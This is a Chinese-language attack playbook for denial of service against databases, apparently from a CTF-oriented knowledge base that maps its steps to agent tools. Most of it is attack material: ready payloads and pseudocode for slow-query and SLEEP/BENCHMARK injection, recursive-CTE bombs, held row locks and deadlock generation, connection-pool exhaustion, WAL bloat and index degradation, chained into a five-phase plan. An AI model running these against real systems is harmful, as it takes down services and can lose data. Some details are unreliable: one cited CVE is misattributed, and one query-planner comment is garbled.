# 数据库层拒绝服务

## 场景

数据库是应用的核心，也是 DoS 的黄金目标。攻击者在 SQL 注入、慢查询、死锁、连接耗尽等层面直接瘫痪数据库，使所有依赖该数据库的服务同时不可用。

```
数据库 DoS 三大路径:
  - 查询层面: 慢查询注入 / 死锁构造 / 全表扫描
  - 连接层面: 连接池耗尽 / 空闲事务占锁
  - 存储层面: WAL 日志膨胀 / 磁盘写满 / 索引退化
```

## 输入信号

- 数据库连接数 `pg_stat_activity` / `SHOW PROCESSLIST` 接近 `max_connections`，大量连接处于 `idle in transaction`
- 慢查询日志 (`log_min_duration_statement` / `slow_query_log`) 爆炸，单查询执行时间 > 10s
- 行锁等待数飙升，`pg_locks` / `INFORMATION_SCHEMA.INNODB_LOCK_WAITS` 表增长
- 死锁检测器频繁触发 → 事务被回滚计数增加 (PostgreSQL `deadlocks` 计数器，MySQL `SHOW ENGINE INNODB STATUS`)
- WAL / binlog 磁盘使用率连续增长，达到或接近 `diskfull` 阈值
- PostgreSQL `pg_stat_bgwriter` 显示 `buffers_clean` / `maxwritten_clean` 持续上升
- 索引 `pg_stat_user_indexes.idx_scan` 统计中索引扫描次数下降，SeqScan 上升 (索引退化)
- CPU `iowait` 占比异常高 (大量磁盘扫描)
- `pg_stat_statements` 中重复出现笛卡尔积、递归 CTE、ORDER BY random() 等明显恶意查询模式

---

## 方法 1: 慢查询注入 (Slow Query Injection)

### 原理

通过注入或构造高开销的查询，使数据库 CPU/IO 满载。

```
单次查询即可瘫痪的经典模式:

1. 笛卡尔积:
   SELECT * FROM users, orders, products, items
   → 4 表交叉连接 → O(n⁴) 行

2. 正则匹配:
   WHERE email ~ '^(a+)+$' AND email = 'aaaaaaaaaaaaaaaaaaaaa!'
   → 每行执行 ReDoS 正则

3. 递归 CTE:
   WITH RECURSIVE r AS (SELECT 1 UNION ALL SELECT 1 FROM r)
   SELECT * FROM r
   → 无限递归 CTE → 内存/CPU 耗尽

4. 聚合排序:
   SELECT * FROM huge_table ORDER BY random()
   → 对每行计算 random() → materialize 整个表 → O(n log n) 排序

5. 全表 LIKE:
   WHERE text LIKE '%a%b%c%d%e%'
   → 无法用索引 → 全表扫描 + 每行多次匹配

6. 函数索引退化:
   WHERE LOWER(email) = 'x'
   如果索引是 email 而非 LOWER(email) → 全表扫描
```

### SQL 特定慢查询

```sql
-- PostgreSQL 特定:

-- 全表 JSONB 操作
SELECT * FROM items WHERE metadata @> '{"key": "value"}'::jsonb
-- 无 GIN 索引 → 全表扫描 + JSONB 解析

-- 大表 array_agg
SELECT user_id, array_agg(content) FROM comments GROUP BY user_id
-- 某个 user_id 有 100 万条评论 → array_agg 构建 100 万元素数组

-- 窗口函数全排序
SELECT *, ROW_NUMBER() OVER (ORDER BY created_at) FROM events
-- 全表排序 → 磁盘溢出 (spill to disk)

-- 递归 CTE 炸弹
WITH RECURSIVE bomb AS (
    SELECT 1 AS n
    UNION ALL
    SELECT n + 1 FROM bomb WHERE n < 100000000
)
SELECT count(*) FROM bomb
-- 递归 1 亿次 → CPU 密集


-- MySQL 特定:

-- SLEEP 注入
SELECT SLEEP(30) FROM users WHERE id IN (SELECT id FROM users)
-- 每匹配行 sleep 30s → N × 30s

-- BENCHMARK 注入
SELECT BENCHMARK(500000000, MD5('test'))
-- 重复执行 5 亿次 MD5

-- 大表 JOIN + filesort
SELECT * FROM orders o, order_items oi 
ORDER BY o.total DESC LIMIT 1
-- 无索引 → 创建临时表 → filesort


-- MongoDB 特定:

-- $where JavaScript 注入
db.users.find({ $where: "sleep(30000) || true" })
-- 每行执行 JS sleep → 阻塞

-- 无索引聚合
db.orders.aggregate([
    { $sort: { createdAt: 1 } },  // 无索引 → 内存排序
    { $group: { _id: null, total: { $sum: "$amount" } } }
])
```

### 伪代码

```
function slow_query_dos(db_connection, query_type="CARTESIAN"):
    """
    数据库慢查询注入
    
    攻击路径:
      a) 直接 SQL 注入 → 注入慢查询
      b) 合法查询参数 → 导致慢查询
      c) ORM 层 N+1 放大
    """
    
    slow_queries = {
        "CARTESIAN_PG": """
            SELECT count(*) FROM 
            generate_series(1, 100000) a,
            generate_series(1, 100000) b
        """,
        
        "RECURSIVE_CTE": """
            WITH RECURSIVE bomb(n) AS (
                SELECT 1
                UNION ALL
                SELECT n + 1 FROM bomb WHERE n < 50000000
            )
            SELECT max(n) FROM bomb
        """,
        
        "REGEX_BOMB": """
            SELECT count(*) FROM users
            WHERE email ~ '([a-zA-Z0-9]*)+\\.(com|org|net)'
            AND id < 1000000
        """,
        
        "RANDOM_SORT": """
            SELECT * FROM events 
            ORDER BY random() 
            LIMIT 100000
        """,
        
        "JSONB_SCAN": """
            SELECT * FROM items 
            WHERE data->>'description' LIKE '%trigger%'
        """,
        
        "WINDOW_FUNCTION": """
            SELECT user_id, event_type,
                   ROW_NUMBER() OVER (
                       PARTITION BY user_id 
                       ORDER BY created_at DESC
                   ),
                   SUM(duration) OVER (
                       PARTITION BY user_id, event_type
                       ORDER BY created_at
                       ROWS BETWEEN 100 PRECEDING AND CURRENT ROW
                   )
            FROM events
            WHERE created_at > '2000-01-01'
        """,
    }
    
    query = slow_queries[query_type]
    
    # 并发发送
    for _ in range(20):
        spawn:
            db_connection.execute(query)
    
    # 如果是 SQL 注入场景:
    # payload = "' UNION SELECT 1 FROM (SELECT * FROM ... CROSS JOIN ...) a--"
    # inject_payload(endpoint, payload)
```

## 方法 2: 行锁 / 死锁构造

### 原理

利用数据库锁机制使合法事务阻塞或死锁。

```
锁攻击路径:

1. 排他锁持有:
   BEGIN;
   SELECT * FROM orders WHERE id = 123 FOR UPDATE;
   -- 不提交 → 行锁永久持有
   -- 所有 UPDATE orders WHERE id = 123 被阻塞

2. 间隙锁 (MySQL InnoDB):
   BEGIN;
   SELECT * FROM orders WHERE id BETWEEN 100 AND 200 FOR UPDATE;
   -- 锁定 100-200 之间的间隙 → INSERT 被阻塞

3. 表锁:
   LOCK TABLE users IN ACCESS EXCLUSIVE MODE;
   -- 所有对 users 的读写全部阻塞

4. 死锁:
   事务 A: UPDATE orders SET ... WHERE id = 1; → 等 B 释放 id=1
   事务 B: UPDATE orders SET ... WHERE id = 2; → 等 A 释放 id=2
   → 数据库自动检测死锁 → 回滚 B
   → 但攻击者持续制造死锁 → 持续回滚
   → 正常事务也被回滚
```

### 伪代码

```
function database_lock_dos(db_config, lock_target="hot_row"):
    """
    数据库锁攻击
    
    目标:
      - 锁定热点行 → 业务核心流程全部阻塞
      - 制造死锁 → 数据库持续回滚事务
      - 表锁 → 整表不可读写
    """
    
    import asyncpg, asyncio
    
    async def hold_row_lock(conn_id):
        conn = await asyncpg.connect(db_config)
        
        while True:
            await conn.execute("BEGIN")
            
            # 锁定热点数据
            # 例如: 系统配置表、库存表、用户余额表
            await conn.execute(
                "SELECT * FROM inventory WHERE product_id = $1 FOR UPDATE NOWAIT",
                12345
            )
            
            # 持有锁不释放
            await asyncio.sleep(60)
            
            # 永不 COMMIT → 行锁持续持有
        
        # conn 关闭时自动 ROLLBACK
    
    async def deadlock_generator():
        """
        持续制造死锁使数据库回滚正常事务
        """
        while True:
            try:
                conn = await asyncpg.connect(db_config)
                await conn.execute("BEGIN")
                
                # 以不同顺序获取锁 → 制造死锁条件
                await conn.execute(
                    "UPDATE orders SET status = 'processing' WHERE id = 1"
                )
                await asyncio.sleep(1)
                await conn.execute(
                    "UPDATE orders SET status = 'processing' WHERE id = 2"
                )
                # 另一个并发事务以相反顺序锁定 → 死锁
                
            except asyncpg.DeadlockDetectedError:
                pass  # 死锁 → 回滚 → 继续制造
            except Exception:
                pass
    
    # 并发
    tasks = [hold_row_lock(i) for i in range(50)]
    tasks += [deadlock_generator() for _ in range(20)]
    await asyncio.gather(*tasks)
```

## 方法 3: 连接池耗尽

### 攻防双方视角

```
数据库连接池配置 (典型):
  max_connections: 100-200
  pool_timeout: 30s (等待连接超时)
  
攻击:
  每个慢查询占一个连接 30s
  攻击者只需要 100-200 个并发慢查询
  → 连接池满 → 正常请求等待连接 → timeout

关键: 攻击者不需要高带宽/并发
  200 个连接 × 每连接 1 次查询 = 200 请求
  连接池就被占满 30 秒 (每个慢查询持续 30s)
```

### 利用空闲事务占连接

```
# 比慢查询更隐蔽: 事务打开但空闲

BEGIN;
SELECT 1;  -- 做一个小查询
-- 然后什么都不做
-- 连接保持 IDLE IN TRANSACTION 状态
-- pg_stat_activity 显示 state='idle in transaction'
-- 占用 connection pool 槽位但不消耗 CPU

# PostgreSQL:
SELECT pg_sleep(3600);  -- 单连接阻塞 1 小时
# 100 个连接同时执行 → 连接池满 1 小时

# MySQL:
SELECT SLEEP(3600);
# 同样效果
```

## 方法 4: WAL / Binlog 日志膨胀

### 原理

通过大量写入操作触发数据库的 WAL (PostgreSQL) 或 binlog (MySQL) 膨胀，最终写满磁盘。

```
PostgreSQL WAL:
  每次 INSERT/UPDATE/DELETE → 写 WAL
  正常: 每小时几百 MB
  攻击: 每秒 INSERT 10000 条 → WAL 每秒膨胀

如果 WAL 写满磁盘:
  - PostgreSQL PANIC → 所有事务失败
  - 需要立即 vacuum + 扩展磁盘
  - 恢复时间取决于 WAL 大小

攻击:
  -- 大量生成 WAL
  INSERT INTO events (data) SELECT md5(random()::text) 
  FROM generate_series(1, 1000000);
  
  -- 大量 UPDATE 也生成 WAL
  UPDATE users SET updated_at = NOW();
  
  -- 大量 DELETE 也生成 WAL (标记 dead tuples)
  DELETE FROM sessions WHERE created_at < NOW();
```

### 伪代码

```
function wal_binlog_explosion(db_config, write_rate=1000, duration=120):
    """
    WAL/Binlog 膨胀攻击
    
    原理:
      写入大量垃圾数据 → WAL 增长
      不 commit → 仍然写 WAL
      ROLLBACK → WAL 记录了完整事务 (不删除)
    """
    
    async def wal_writer():
        conn = await asyncpg.connect(db_config)
        
        deadline = now() + duration
        while now() < deadline:
            # 开始事务
            await conn.execute("BEGIN")
            
            # 大量写入
            for _ in range(100):
                await conn.execute("""
                    INSERT INTO wal_bomb (data, created_at)
                    SELECT md5(random()::text), clock_timestamp()
                    FROM generate_series(1, 100)
                """)
            
            # 回滚 → WAL 不删除 (已写入)
            await conn.execute("ROLLBACK")
    
    # 并发写入
    tasks = [wal_writer() for _ in range(write_rate // 10)]
    await asyncio.gather(*tasks)
```

## 方法 5: 索引退化攻击

### 原理

通过特定的数据模式使数据库索引失效或退化。

```
B-Tree 退化:
  插入有序键 (单调递增) → B-Tree 退化为右倾链表
  不过大多数数据库的 B-Tree 有优化 (fill factor)
  
  插入随机键 + 频繁删除 → 索引碎片 → 扫描效率下降

PostgreSQL 索引膨胀:
  频繁 UPDATE + VACUUM 不及时 → dead tuples 堆积
  索引大小 > 实际数据 10x
  
BRIN 索引退化:
  BRIN 对物理相邻性敏感
  无序插入 → BRIN 退化 → 所有范围扫描变成全表
```

### 伪代码

```
function index_degradation(db_config):
    """
    索引退化攻击 — 使数据库查询性能衰退
    
    方法:
      1. 数据碎片化
      2. 统计信息污染
      3. 触发错误的查询计划
    """
    
    # 1. 制造数据碎片
    # 交替 INSERT + DELETE → 索引页碎片
    for i in range(100000):
        db_execute(
            "INSERT INTO t (id, data) VALUES ($1, $2) "
            "ON CONFLICT (id) DO UPDATE SET data = $2",
            random_int(1, 10000), random_bytes(8192)
        )
        if i % 3 == 0:
            db_execute("DELETE FROM t WHERE id = $1", 
                       random_int(1, 10000))
    
    # 2. 污染统计信息
    # PostgreSQL 自动 ANALYZE 采样表中数据
    # 大量临时数据使采样不准确 → 错误的查询计划
    
    # 创建统计噪声
    for i in range(1000000):
        db_execute("INSERT INTO stats_noise VALUES ($1)", 
                   "A" * random_int(1, 100))
    # 然后 DELETE 但不过期统计信息
    db_execute("DELETE FROM stats_noise")
    # 现在统计信息显示大量数据 → nested loop 被选为 hash join
    # → 性能严重退化
    
    # 3. 强制 SeqScan
    # PostgreSQL 中，如果随机页开销设置不对 + 数据碎片
    # → planner 选择 SeqScan 而非 IndexScan
    # → 查询从 O(log n) 变成 O(n)
```

## 方法 6: 全库全文搜索攻击

```
PostgreSQL Full Text Search:
  
  SELECT * FROM articles 
  WHERE to_tsvector('english', content) @@ plainto_tsquery('english', 'a')
  → 匹配所有包含 'a' 的文档 → 大量结果

  SELECT * FROM articles 
  WHERE to_tsvector('english', content) @@ to_tsquery('english', 'a|b|c|...|z')
  → OR 条件匹配几乎所有文档

  SELECT ts_rank_cd(to_tsvector('english', content), 
                     plainto_tsquery('english', 'a a a a a'))
  → 对每个文档计算 rank → CPU 密集
```

## 攻击链

```
数据库 DoS 综合方案:

Phase 1 — 侦察:
  1. 探测数据库类型 (MySQL/PostgreSQL/MongoDB)
  2. 识别连接池大小 (试探性增加并发 → 观察超时)
  3. 枚举慢查询端点

Phase 2 — 连接耗尽:
  4. pg_sleep / SLEEP 查询 → 快速占满连接池
  5. Idle-in-transaction → 隐蔽持有连接
  6. 连接池满时正常用户 timeout

Phase 3 — CPU/IO 耗尽:
  7. 慢查询注入 → CPU 100%
  8. 全表扫描 + ORDER BY RANDOM → IOPS 打满
  9. 笛卡尔积 → 内存 OOM

Phase 4 — 锁攻击:
  10. 锁定热点行 → 业务核心流程阻塞
  11. 死锁制造 → 持续回滚正常事务
  12. 表锁 → 整表不可用

Phase 5 — 存储耗尽:
  13. WAL/binlog 膨胀 → 磁盘满
  14. 索引碎片 → 查询持续慢
  15. 全库无法写入 → 数据丢失
```

## 参考资料

1. CVE-2011-4885 — PHP Hash Collision DoS (POST body → DB parameter parsing)
2. CVE-2022-30115 — .NET HashCollision (FormReader → connection pool exhaustion)
3. "PostgreSQL: Detecting and Preventing Slow Queries" — PostgreSQL Wiki
4. "MySQL: Deadlock Detection and Resolution" — MySQL Reference Manual
5. "PostgreSQL WAL Configuration and Monitoring" — PostgreSQL Documentation
6. "PostgreSQL Index Maintenance and Bloat" — pgstattuple / pg_repack
7. "Database Connection Pool Sizing" — HikariCP & PgBouncer best practices
8. "SQL Injection to DoS: Beyond Data Extraction" — OWASP, 2022
9. "Row Locks and FOR UPDATE: PostgreSQL Concurrency Control" — PostgreSQL docs
10. "MongoDB Aggregation Pipeline DoS" — MongoDB Security Advisory, 2020
11. "Elasticsearch: Avoiding Expensive Queries" — Elasticsearch Guide

## MCP 工具映射

| 步骤 | 工具 | 说明 |
|------|------|------|
| SQL 注入探测 | `http_probe` / `run_ctf_tool` | 探测 SQL 注入点 |
| 技术搜索 | `kb_router` | 搜索 sql / database / deadlock |
| 技术查阅 | `kb_read_file` | 读取本文件及 03-injection/sqli |

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
